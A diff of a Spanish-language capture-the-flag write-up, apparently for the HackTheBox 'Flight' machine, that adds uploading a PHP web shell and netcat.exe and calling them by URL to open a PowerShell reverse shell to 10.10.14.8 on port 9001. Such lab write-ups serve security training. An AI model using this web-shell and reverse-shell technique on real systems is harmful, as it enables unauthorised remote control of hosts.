@@ -191,9 +191,10 @@ ahora que ya tenemos el binario en nuestra ubicación de trabajo vamos a subirlo
 ```python
 put shell.php
 
-put
+put netcat.exe
 ```
 
 ahora solo debemos cargar los dos archivos y luego podemos ejecutarlo desde la web con el siguiente comando
 `http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe 10.10.14.8 9001`
 ![[Pasted image 20240810145130.png]]
+
